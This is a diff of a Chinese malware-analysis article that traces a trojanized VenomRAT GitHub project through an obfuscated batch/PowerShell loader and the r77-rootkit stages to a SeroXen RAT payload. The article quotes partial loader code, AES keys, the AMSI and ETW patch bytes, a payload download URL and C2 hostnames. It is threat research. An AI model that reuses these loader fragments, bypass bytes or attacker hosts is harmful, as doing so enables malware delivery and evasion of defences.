@@ -1,18 +1,18 @@
 
 
-# 携带恶意rootkit的github项目通过SeroXen RAT木马攻击github项目使用人员 - 先知社区
+# 携带恶意 rootkit 的 github 项目通过 SeroXen RAT 木马攻击 github 项目使用人员 - 先知社区
 
-携带恶意rootkit的github项目通过SeroXen RAT木马攻击github项目使用人员
+携带恶意 rootkit 的 github 项目通过 SeroXen RAT 木马攻击 github 项目使用人员
 
 - - -
 
 ## 概述
 
-在笔者上一篇《NET环境下的多款同源RAT对比》文章中，笔者尝试对多款NET木马进行了同源对比分析，其中在对VenomRAT项目进行研究的过程中，笔者发现此项目中貌似携带了可疑代码程序，尝试对可疑代码程序进行简单的分析，笔者确认了此样本的恶意行为，但由于此样本的攻击过程较复杂，因此，笔者当时就并未对其进行详细的研究分析。
+在笔者上一篇《NET 环境下的多款同源 RAT 对比》文章中，笔者尝试对多款 NET 木马进行了同源对比分析，其中在对 VenomRAT 项目进行研究的过程中，笔者发现此项目中貌似携带了可疑代码程序，尝试对可疑代码程序进行简单的分析，笔者确认了此样本的恶意行为，但由于此样本的攻击过程较复杂，因此，笔者当时就并未对其进行详细的研究分析。
 
 一晃过了还是快一周了，于是，最近决定把它拿出来详细的剖析剖析。
 
-携带恶意rootkit的github项目地址：[https://github.com/VenomRATHVNC/VenomRAT-HVNC-5.6](https://github.com/VenomRATHVNC/VenomRAT-HVNC-5.6)
+携带恶意 rootkit 的 github 项目地址：[https://github.com/VenomRATHVNC/VenomRAT-HVNC-5.6](https://github.com/VenomRATHVNC/VenomRAT-HVNC-5.6)
 
 项目截图如下：
 
@@ -20,11 +20,11 @@
 
 ## 如何发现？
 
-在最开始的时候，其实笔者是没有发现此项目中携带了恶意rootkit的，一是因为笔者本身习惯性的在虚拟机中使用研究此类项目，因此就没有担心中病毒的情况，二是因为笔者发现此项目的运行还是挺正常的，运行控制端程序有正常的GUI界面弹出，只是弹出的GUI界面并非RAT控制端界面，而是RAT控制端的登录界面。因此，笔者就一直没有对其恶意性进行怀疑，只是一直在琢磨怎么能够正常使用。
+在最开始的时候，其实笔者是没有发现此项目中携带了恶意 rootkit 的，一是因为笔者本身习惯性的在虚拟机中使用研究此类项目，因此就没有担心中病毒的情况，二是因为笔者发现此项目的运行还是挺正常的，运行控制端程序有正常的 GUI 界面弹出，只是弹出的 GUI 界面并非 RAT 控制端界面，而是 RAT 控制端的登录界面。因此，笔者就一直没有对其恶意性进行怀疑，只是一直在琢磨怎么能够正常使用。
 
-在研究琢磨怎么能够正常使用的过程中，笔者尝试使用了多款安全分析工具对VenomRAT项目控制端进行了研究，经过一系列努力，最终笔者通过调试可直接绕过登录，成功登录后即可正常显示RAT控制端。
+在研究琢磨怎么能够正常使用的过程中，笔者尝试使用了多款安全分析工具对 VenomRAT 项目控制端进行了研究，经过一系列努力，最终笔者通过调试可直接绕过登录，成功登录后即可正常显示 RAT 控制端。
 
-由于笔者在研究过程中运行了多款安全分析工具，因此，在正常显示RAT控制端后，笔者就下意识的准备看看它的进程结构，结果，**不看不知道，一看吓一跳，笔者发现VenomRAT控制端进程下面多了很多的其他进程。**
+由于笔者在研究过程中运行了多款安全分析工具，因此，在正常显示 RAT 控制端后，笔者就下意识的准备看看它的进程结构，结果，**不看不知道，一看吓一跳，笔者发现 VenomRAT 控制端进程下面多了很多的其他进程。**
 
 相关截图如下：
 
@@ -36,11 +36,11 @@
 
 [![](assets/1709874485-50154f20f3818202c879578b1c29707d.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240307174231-04af6cec-dc67-1.png)
 
-## VenomRAT程序中被植入恶意代码
+## VenomRAT 程序中被植入恶意代码
 
-由于笔者发现在VenomRAT控制端进程下，运行了很多的可疑进程程序，因此，笔者准备对其行为进行一谈究竟。
+由于笔者发现在 VenomRAT 控制端进程下，运行了很多的可疑进程程序，因此，笔者准备对其行为进行一谈究竟。
 
-通过对VenomRAT项目源码进行分析，笔者发现VenomRAT项目会在多个代码片段处执行“Stub\\ClientFix.bat”文件，若项目中无“Stub\\ClientFix.bat”文件，还会从`hxxps://underground-cheat.com/venomFix/ClientFix.bat`地址处下载“Stub\\ClientFix.bat”文件。
+通过对 VenomRAT 项目源码进行分析，笔者发现 VenomRAT 项目会在多个代码片段处执行“Stub\\ClientFix.bat”文件，若项目中无“Stub\\ClientFix.bat”文件，还会从`hxxps://underground-cheat.com/venomFix/ClientFix.bat`地址处下载“Stub\\ClientFix.bat”文件。
 
 相关代码截图如下：
 
@@ -52,16 +52,16 @@
 
 [![](assets/1709874485-5b6a6b18a554665702f62755e28d188d.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240307174310-1bc7884c-dc67-1.png)
 
-尝试基于VT对其进行关联分析，笔者发现此域名下关联了大量的恶意程序，相关截图如下：
+尝试基于 VT 对其进行关联分析，笔者发现此域名下关联了大量的恶意程序，相关截图如下：
 
 [![](assets/1709874485-a3dde3755e37fe2fab0e66d412565e9e.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240307174324-243c3ad6-dc67-1.png)
 
-## 混淆的bat脚本
+## 混淆的 bat 脚本
 
 ```plain
 文件名称：VenomRAT-V5.6-HVNC\Stub\ClientFix.bat
 文件大小：11052586 字节
-修改时间：2022年12月23日 16:27:46
+修改时间：2022 年 12 月 23 日 16:27:46
 MD5     ：42EF9DB764C0F7361BA2157D9553C0E6
 SHA1    ：6AF1E60F9CD75627DA67C3103B8E83D492F6D9D4
 CRC32   ：4BAEBE66
@@ -115,12 +115,12 @@ $OfYbS.Invoke($null, (, [string[]]('')))
 进一步分析，笔者发现此代码的功能为：
 
 -   从“Stub\\ClientFix.bat”文件中提取“::”行内容；
--   使用Base64对其内容进行解码；
--   使用AES对其解码后内容进行解密；
--   使用gzip解压算法对其解密内容进行解压，解压获取一个PE文件；
--   执行此PE文件；
+-   使用 Base64 对其内容进行解码；
+-   使用 AES 对其解码后内容进行解密；
+-   使用 gzip 解压算法对其解密内容进行解压，解压获取一个 PE 文件；
+-   执行此 PE 文件；
 
-提取AES密钥信息如下：
+提取 AES 密钥信息如下：
 
 ```plain
 #AES Key
@@ -149,7 +149,7 @@ SHA1    ：704F2104D1966FF7C59AD9ADF3C2FA74A0862EA5
 CRC32   ：25B546BC
 ```
 
-尝试对解密提取的tmpB23C文件进行分析，发现此样本被混淆处理了，因此，使用de4dot程序去除混淆，然后使用dnspy反编译查看代码，通过分析，发现反编译代码中调用了大量的数学运算，用于解密字符串等信息。
+尝试对解密提取的 tmpB23C 文件进行分析，发现此样本被混淆处理了，因此，使用 de4dot 程序去除混淆，然后使用 dnspy 反编译查看代码，通过分析，发现反编译代码中调用了大量的数学运算，用于解密字符串等信息。
 
 相关代码截图如下：
 
@@ -157,30 +157,30 @@ CRC32   ：25B546BC
 
 ### bypassAmsi
 
-通过分析，发现此样本会调用VirtualProtect及Marshal.Copy函数将AmisiScanBuffer函数ret掉，实现绕过AMSI的效果：
+通过分析，发现此样本会调用 VirtualProtect 及 Marshal.Copy 函数将 AmisiScanBuffer 函数 ret 掉，实现绕过 AMSI 的效果：
 
--   AMSI技术原理：amsi是微软提供的一个接口，旨在允许应用程序和服务与已安装的杀毒或反恶意软件解决方案进行互动，从而提供更好的保护。其中最关键的函数当属AmisiScanBuffer，AmsiScanBuffer函数可以检测内存中的恶意内容，这对于检测那些可能在运行时生成或修改其代码的恶意软件特别有用，例如某些脚本或文件less的恶意软件。
--   绕过AMSI的技术原理：将amsi.dll里的关键函数`AmsiScanBuffer`给ret掉，填充的硬编码指令为`0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3`，对应汇编指令为`mov eax, 0x80070057，ret`
+-   AMSI 技术原理：amsi 是微软提供的一个接口，旨在允许应用程序和服务与已安装的杀毒或反恶意软件解决方案进行互动，从而提供更好的保护。其中最关键的函数当属 AmisiScanBuffer，AmsiScanBuffer 函数可以检测内存中的恶意内容，这对于检测那些可能在运行时生成或修改其代码的恶意软件特别有用，例如某些脚本或文件 less 的恶意软件。
+-   绕过 AMSI 的技术原理：将 amsi.dll 里的关键函数`AmsiScanBuffer`给 ret 掉，填充的硬编码指令为`0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3`，对应汇编指令为`mov eax, 0x80070057，ret`
 -   相关参考文档：[https://github.com/rasta-mouse/AmsiScanBufferBypass、https://www.henry-blog.life/henry-blog/readme/executeassembly-yuan-li](https://github.com/rasta-mouse/AmsiScanBufferBypass%E3%80%81https://www.henry-blog.life/henry-blog/readme/executeassembly-yuan-li)
 
 相关代码截图如下：
 
 [![](assets/1709874485-7326cc648a7972bdca47377867c5f4e4.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240307174503-5f76ecae-dc67-1.png)
 
-### 绕过ETW
+### 绕过 ETW
 
-通过分析，发现此样本会调用VirtualProtect及Marshal.Copy函数将ETW的关键函数`EtwEventWrite`给ret掉，实现绕过ETW的效果：
+通过分析，发现此样本会调用 VirtualProtect 及 Marshal.Copy 函数将 ETW 的关键函数`EtwEventWrite`给 ret 掉，实现绕过 ETW 的效果：
 
--   ETW技术原理：ETW（Event Tracing for Windows）是Windows操作系统提供的一种事件跟踪技术，用于在系统和应用程序中收集、记录和分析事件信息。
--   绕过ETW的技术原理：将ETW的关键函数`EtwEventWrite`给ret掉，填充的硬编码指令为`0xC3`，对应汇编指令为`ret`
+-   ETW 技术原理：ETW（Event Tracing for Windows）是 Windows 操作系统提供的一种事件跟踪技术，用于在系统和应用程序中收集、记录和分析事件信息。
+-   绕过 ETW 的技术原理：将 ETW 的关键函数`EtwEventWrite`给 ret 掉，填充的硬编码指令为`0xC3`，对应汇编指令为`ret`
 
 相关代码截图如下：
 
 [![](assets/1709874485-aed99dc5431ad7aa4ba618da1bf3719e.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240307174521-6a5d528e-dc67-1.png)
 
-### 反射加载CSStub2
+### 反射加载 CSStub2
 
-进一步分析，发现样本还将从资源中解密释放payload.exe文件，然后调用函数反射加载payload.exe。
+进一步分析，发现样本还将从资源中解密释放 payload.exe 文件，然后调用函数反射加载 payload.exe。
 
 相关代码截图如下：
 
@@ -190,13 +190,13 @@ CRC32   ：25B546BC
 
 ### 自删除
 
-通过分析，发现样本还将调用cmd命令删除自身。
+通过分析，发现样本还将调用 cmd 命令删除自身。
 
 相关代码截图如下：
 
 [![](assets/1709874485-44b1c1560d4ba092e4d78ddc06f6c92d.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240307174610-87090b8a-dc67-1.png)
 
-## 携带嵌入资源的CSStub2程序
+## 携带嵌入资源的 CSStub2 程序
 
 ```plain
 文件名称：CSStub2
@@ -207,7 +207,7 @@ SHA1    ：346CA7E2C1B1A2FB19802046589C34480437813D
 CRC32   ：B2B1F55C
 ```
 
-通过对反射加载的CSStub2程序进行分析，笔者发现此样本的资源中携带了大量的文件，进一步分析，发现其通过调用Costura插件（项目地址：[https://github.com/Fody/Costura）](https://github.com/Fody/Costura%EF%BC%89) 将相关可执行文件嵌入到了此样本中。
+通过对反射加载的 CSStub2 程序进行分析，笔者发现此样本的资源中携带了大量的文件，进一步分析，发现其通过调用 Costura 插件（项目地址：[https://github.com/Fody/Costura）](https://github.com/Fody/Costura%EF%BC%89) 将相关可执行文件嵌入到了此样本中。
 
 相关截图如下：
 
@@ -215,13 +215,13 @@ CRC32   ：B2B1F55C
 
 ### 解密资源
 
-通过分析，发现样本在运行过程中，将调用AES ECB算法对CSStub2.$sxr-nircmd.exe资源、CSStub2.InstallStager.exe资源、CSStub2.UninstallStager.exe资源进行解密：
+通过分析，发现样本在运行过程中，将调用 AES ECB 算法对 CSStub2.$sxr-nircmd.exe 资源、CSStub2.InstallStager.exe 资源、CSStub2.UninstallStager.exe 资源进行解密：
 
--   将`QdwAPQVFDRUxTXQBtRz3PFNHv9aaNR9T0WoD7GSmaxD5ERlZDV3SN6RUbNVO93DvDsdE7qgp5iAKxAf1C8PKc4YMRuO0YtBIddFr`字符串做MD5运算，得到的HASH值将用于AES KEY；
--   使用HASH值构建AES KEY；
--   调用AES ECB算法对加密资源文件进行解密；
+-   将`QdwAPQVFDRUxTXQBtRz3PFNHv9aaNR9T0WoD7GSmaxD5ERlZDV3SN6RUbNVO93DvDsdE7qgp5iAKxAf1C8PKc4YMRuO0YtBIddFr`字符串做 MD5 运算，得到的 HASH 值将用于 AES KEY；
+-   使用 HASH 值构建 AES KEY；
+-   调用 AES ECB 算法对加密资源文件进行解密；
 
-提取AES密钥信息如下：
+提取 AES 密钥信息如下：
 
 ```plain
 aad5862a79751b51bd07fe77ab9530aad5862a79751b51bd07fe77ab95300800
@@ -239,9 +239,9 @@ aad5862a79751b51bd07fe77ab9530aad5862a79751b51bd07fe77ab95300800
 
 | 文件名 | 备注  |
 | --- | --- |
-| CSStub2.InstallStager.exe | r77-rootkit的开源项目 |
-| CSStub2.UninstallStager.exe | r77-rootkit的开源项目 |
-| CSStub2.$sxr-nircmd.exe | NirCmd命令行程序 |
+| CSStub2.InstallStager.exe | r77-rootkit 的开源项目 |
+| CSStub2.UninstallStager.exe | r77-rootkit 的开源项目 |
+| CSStub2.$sxr-nircmd.exe | NirCmd 命令行程序 |
 
 ### CSStub2.InstallStager.exe
 
@@ -256,8 +256,8 @@ CRC32   ：B69B0BA4
 
 尝试对解密后的CSStub2.InstallStager.exe资源文件进行分析，笔者发现此样本依然是一个C#程序，样本功能为：
 
--   从资源中解密InstallStager.Service64.exe载荷内容
--   将载荷注入到winlogon.exe进程中，然后使用Process Hollowing技术通过dllhost.exe执行
+-   从资源中解密 InstallStager.Service64.exe 载荷内容
+-   将载荷注入到 winlogon.exe 进程中，然后使用 Process Hollowing 技术通过 dllhost.exe 执行
 
 相关代码截图如下：
 
@@ -277,7 +277,7 @@ SHA1    ：F3D501C70EC67A89DE662A10B0482FAA4DD5061A
 CRC32   ：CFD16E3B
 ```
 
-进一步对InstallStager.Service64.exe文件进行分析，发现此样本后续功能较丰富：
+进一步对 InstallStager.Service64.exe 文件进行分析，发现此样本后续功能较丰富：
 
 -   将从资源中释放后续载荷文件
 -   将对注册表进行操作
@@ -302,37 +302,37 @@ CRC32   ：CFD16E3B
 
 ### r77-rootkit
 
-为了能够更详细的对CSStub2.InstallStager.exe样本及InstallStager.Service64.exe样本进行分析，笔者在网络中查阅了大量的资料，最终笔者确定CSStub2.InstallStager.exe样本及InstallStager.Service64.exe样本均为r77-rootkit开源项目编译后的模块。
+为了能够更详细的对 CSStub2.InstallStager.exe 样本及 InstallStager.Service64.exe 样本进行分析，笔者在网络中查阅了大量的资料，最终笔者确定 CSStub2.InstallStager.exe 样本及 InstallStager.Service64.exe 样本均为 r77-rootkit 开源项目编译后的模块。
 
-r77-rootkit开源项目地址：[https://github.com/bytecode77/r77-rootkit](https://github.com/bytecode77/r77-rootkit)
+r77-rootkit 开源项目地址：[https://github.com/bytecode77/r77-rootkit](https://github.com/bytecode77/r77-rootkit)
 
-r77-Rootkit开源项目介绍：r77-Rootkit是一个Ring3级别的Rootkit，能够在用户态隐藏自己的各种行为。
+r77-Rootkit 开源项目介绍：r77-Rootkit 是一个 Ring3 级别的 Rootkit，能够在用户态隐藏自己的各种行为。
 
 项目截图如下：
 
 [![](assets/1709874485-4e6af636eed12f6462f3a09fe7ac85f6.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240307175147-4ff5cd4e-dc68-1.png)
 
-尝试将r77-rootkit开源项目与CSStub2.InstallStager.exe样本及InstallStager.Service64.exe样本进行同源对比，笔者发现CSStub2.InstallStager.exe样本及InstallStager.Service64.exe样本确实是由r77-rootkit开源项目编译生成。
+尝试将 r77-rootkit 开源项目与 CSStub2.InstallStager.exe 样本及 InstallStager.Service64.exe 样本进行同源对比，笔者发现 CSStub2.InstallStager.exe 样本及 InstallStager.Service64.exe 样本确实是由 r77-rootkit 开源项目编译生成。
 
-CSStub2.InstallStager.exe样本代码对比情况如下：
+CSStub2.InstallStager.exe 样本代码对比情况如下：
 
 [![](assets/1709874485-520e7621cc39255b0de98c95ea52b439.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240307175206-5b3d46e6-dc68-1.png)
 
 [![](assets/1709874485-46250dc89dc7ce85b2cbc6ffed6dc2dd.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240307175223-65dec5d4-dc68-1.png)
 
-InstallStager.Service64.exe样本代码对比情况如下：
+InstallStager.Service64.exe 样本代码对比情况如下：
 
 [![](assets/1709874485-37532ab0a100f840e5007e1916671c8f.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240307175242-70dd8e8e-dc68-1.png)
 
 [![](assets/1709874485-bcb29ea3594ca8e5a5f693aa6b0b50d4.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240307175259-7b4e57ae-dc68-1.png)
 
-通过对r77-rootkit开源项目进行分析，提取r77-rootkit执行各阶段的流程图如下：
+通过对 r77-rootkit 开源项目进行分析，提取 r77-rootkit 执行各阶段的流程图如下：
 
 [![](assets/1709874485-63ce7e6d26e5c5cfafd34cc40623b54b.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240307175603-e88b76e4-dc68-1.png)
 
 ## 计划任务驻留
 
-通过对CSStub2.InstallStager.exe样本及InstallStager.Service64.exe样本进行分析，我们发现其在运行过程中，会创建计划任务，计划任务内容如下：
+通过对 CSStub2.InstallStager.exe 样本及 InstallStager.Service64.exe 样本进行分析，我们发现其在运行过程中，会创建计划任务，计划任务内容如下：
 
 ```plain
 C: \Windows\$sxr - powershell.exe - NoLogo - NoProfile - Noninteractive - WindowStyle hidden - ExecutionPolicy bypass - Command $IUziZ1 = New - Object System.Security.Cryptography.AesManaged;
@@ -429,16 +429,16 @@ $vhBKp.$DEDSw0($null, (, [string[]]($XVbaw)))
 
 通过对此计划任务内容进行分析，梳理如下：
 
--   使用AES CBC算法解密相关字符串信息：
+-   使用 AES CBC 算法解密相关字符串信息：
     -   AES Key：7337a36860f35e1b51937ad140ec00ec216833dd20e454209c9f392da51941de
     -   AES IV：32b1149b0d8245f2300cde039ee8d56a
     -   解密后的字符串：SOFTWARE、$sxr-YuUPClmUpmhGilfvUVHG、\[Char\]+91+\[Char\]+83+\[Char\]+121+\[Char\]+115+\[Char\]+116+\[Char\]+101+\[Char\]+109+\[Char\]+46+\[Char\]+82+\[Char\]+101+\[Char\]+102+\[Char\]+108+\[Char\]+101+\[Char\]+99+\[Char\]+116+\[Char\]+105+\[Char\]+111+\[Char\]+110+\[Char\]+46+\[Char\]+65+\[Char\]+115+\[Char\]+115+\[Char\]+101+\[Char\]+109+\[Char\]+98+\[Char\]+108+\[Char\]+121+\[Char\]+93 | IEX、ReadAllText、GetValue、OpenSubkey、LocalMachine、CopyTo、Invoke、Decompress、Load、$sxr-powershell
 -   通过解密后的字符串拼凑命令行，从`HKEY_LOCAL_MACHINE\SOFTWARE\$sxr-YuUPClmUpmhGilfvUVHG`注册表项中提取数据
--   使用AES CBC算法解密注册表项中提取的数据内容：
-    -   AES Key与AES IV的值与上相同；
-    -   解密后的内容为gzip压缩内容
--   使用gzip解压缩，解压缩后内容为PE文件；
--   反射加载PE文件**（tmpA72F）**；
+-   使用 AES CBC 算法解密注册表项中提取的数据内容：
+    -   AES Key 与 AES IV 的值与上相同；
+    -   解密后的内容为 gzip 压缩内容
+-   使用 gzip 解压缩，解压缩后内容为 PE 文件；
+-   反射加载 PE 文件**（tmpA72F）**；
 
 解密流程如下：
 
@@ -457,11 +457,11 @@ SHA1    ：ACBB112E4F16E1B1F38F523555245554F91A0C3B
 CRC32   ：1407515B
 ```
 
-对此样本进行分析，发现此样本被混淆处理了，因此，使用de4dot程序去除混淆，然后使用dnspy工具即可正常查看其反编译代码；进一步分析，发现此样本与上述tmpB23C样本，除解密释放的payload.exe载荷不同外，其余整体功能相同，相关代码截图如下：
+对此样本进行分析，发现此样本被混淆处理了，因此，使用 de4dot 程序去除混淆，然后使用 dnspy 工具即可正常查看其反编译代码；进一步分析，发现此样本与上述 tmpB23C 样本，除解密释放的 payload.exe 载荷不同外，其余整体功能相同，相关代码截图如下：
 
 [![](assets/1709874485-1e4d3bea753366361ce30ea42ed5bf9a.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240307175708-0f93095a-dc69-1.png)
 
-## SeroXen RAT木马
+## SeroXen RAT 木马
 
 ```plain
 文件名称：payload.exe
@@ -472,9 +472,9 @@ SHA1    ：46863B3B07FB390C7BC05CDEB64B310E9894FAF7
 CRC32   ：5C79FD5C
 ```
 
-对此样本进行分析，发现此样本也被混淆处理了，因此，继续使用de4dot功能与dnspy工具相结合，即可正常查看其反编译代码。
+对此样本进行分析，发现此样本也被混淆处理了，因此，继续使用 de4dot 功能与 dnspy 工具相结合，即可正常查看其反编译代码。
 
-进一步对比样本进行分析，笔者发现此样本即为SeroXen RAT木马实体，由于SeroXen RAT是基于Quasar RAT项目的，因此其反编译代码与Quasar RAT的反编译代码极其相似。
+进一步对比样本进行分析，笔者发现此样本即为 SeroXen RAT 木马实体，由于 SeroXen RAT 是基于 Quasar RAT 项目的，因此其反编译代码与 Quasar RAT 的反编译代码极其相似。
 
 相关代码截图如下：
 
@@ -482,13 +482,13 @@ CRC32   ：5C79FD5C
 
 ### 配置信息解密
 
-由于SeroXen RAT的反编译代码与Quasar RAT的反编译代码极其相似，因此我们可以采用笔者前期《QuasarRAT与AsyncRAT同源对比及分析》文章中提供的配置信息解密脚本对其配置信息进行解密。
+由于 SeroXen RAT 的反编译代码与 Quasar RAT 的反编译代码极其相似，因此我们可以采用笔者前期《QuasarRAT 与 AsyncRAT 同源对比及分析》文章中提供的配置信息解密脚本对其配置信息进行解密。
 
-SeroXen RAT样本配置信息截图如下：
+SeroXen RAT 样本配置信息截图如下：
 
 [![](assets/1709874485-92c633323cc5b9fa4804e85024332226.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240307175747-26cd7d80-dc69-1.png)
 
-解密后结果如下：**（解密的字符串中存在seroxen字符串）**
+解密后结果如下：**（解密的字符串中存在 seroxen 字符串）**
 
 ```plain
 Version:1.4.0
@@ -496,7 +496,7 @@ Hosts:dofucks.com:12482;private115.duckdns.org:12482;
 Install Subdirectory:
 Install Name:.exe
 Mutex：adf10731-c83d-4166-9137-39d0b1e48856
-Startup Name：$sxr-seroxen
+Startup Name:$sxr-seroxen
 Client Tag:v15.4.1 | Venom
 Log Directory Name:$sxr-Logs
 Serversignature:lqUkxdzwxgbOlYuIPVObQJBs3QffK3qoqKQoJ/8r37WXI/zMaghHdnXsPremJ56CFRa07VGmdUuTexJBSvnAGq19XEnckMPf3xXK4GG2UFmRCilXzbU5EwTOn7RKEAo70/VU5o6Dpn+xmsORHX4gRLq9d6Rlsn0SbRsYE6OUa1AO+XE0ywTeCH8HvQ7DGRfedEzqwz0yXQ9cggCGyPW1vTeAqOYjyQVRt31VVfXelK5jMYgeAO8Ap+UCNS58mOgGA/IxJ05y3PU9dnGZ6fWgb71ZVMff49W0zmccGuaXrIRa4+XW2hld4SkFcNtRiYoLiYoZVqzwfu6f4luLa72n0Jv7n476ZJKWryKdsYI3PV/GmtfjTViQJWizq9aqUY1WpIYJUt5MYGxS0ORiwoVQy9MaXhzRKPxTUHlN6pc7CdPZTaXjQdYx4bDjHvya/IFguDC2N5J2ZTF+w3PmXKGEaOeJ3j+VSWa9qIoNZJSKE78lQ/X5CkVeQcEBOnTv93olvczTaEdTXVsCOUvVWBVibqS6eT/1VzygSgCnCB+CuAvFj8iRaqDRJVp29rZslpnDkhE25ZfOlqmgwGH2T1wQJ21iyVDgpdqyfFpyGShldZXfvJ8KVxe8P8ygLIjK5+vteIJVQjb4rX2arOceMO6r6rOpAgHQWOlMLJdj628TV60=
@@ -509,7 +509,7 @@ Certificate:MIIE9DCCAtygAwIBAgIQAPWuYhP6uaFvN0fnes1IQzANBgkqhkiG9w0BAQ0FADAbMRkw
 
 解密提取的证书信息截图如下：
 
-**备注：证书信息与Quasar生成的证书信息相似。此情况与`https://cybersecurity.att.com/blogs/labs-research/seroxen-rat-for-sale`报告中提到的情况相同**
+**备注：证书信息与 Quasar 生成的证书信息相似。此情况与`https://cybersecurity.att.com/blogs/labs-research/seroxen-rat-for-sale`报告中提到的情况相同**
 
 [![](assets/1709874485-3c840662ec416984a0c4a08754b3c014.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240307175832-417608c8-dc69-1.png)
 
@@ -521,17 +521,17 @@ Certificate:MIIE9DCCAtygAwIBAgIQAPWuYhP6uaFvN0fnes1IQzANBgkqhkiG9w0BAQ0FADAbMRkw
 | dofucks.com:12482 | 199.59.243.225 |     |
 | private115.duckdns.org:12482 | 91.178.236.90 |
 
-结合VT进行分析，笔者发现攻击者的域名及IP资产存在相互解析的情况，相关截图如下：
+结合 VT 进行分析，笔者发现攻击者的域名及 IP 资产存在相互解析的情况，相关截图如下：
 
 [![](assets/1709874485-e1d4346f5cf6b7e382b0b6e74fff7168.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240307175852-4d6c0074-dc69-1.png)
 
-## 其他携带恶意程序的github项目
+## 其他携带恶意程序的 github 项目
 
-除VenomRAT-HVNC-5.6项目外，笔者还发现[VenomRAT-v6.0.3-SOURCE-](https://github.com/Litrik002/VenomRAT-v6.0.3-SOURCE-)项目中也存在恶意代码程序，项目截图如下：
+除 VenomRAT-HVNC-5.6 项目外，笔者还发现[VenomRAT-v6.0.3-SOURCE-](https://github.com/Litrik002/VenomRAT-v6.0.3-SOURCE-)项目中也存在恶意代码程序，项目截图如下：
 
 [![](assets/1709874485-1ee4aaec9d15630fe3ead197f1fb7386.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240307175912-5957b6d0-dc69-1.png)
 
-恶意代码程序为伪装成Venom RAT控制端的Venom RAT + H.exe程序，相关截图如下：
+恶意代码程序为伪装成 Venom RAT 控制端的 Venom RAT + H.exe 程序，相关截图如下：
 
 [![](assets/1709874485-c5613150866df5cc021836fe4e274fb1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240307175926-61fd3198-dc69-1.png)
 
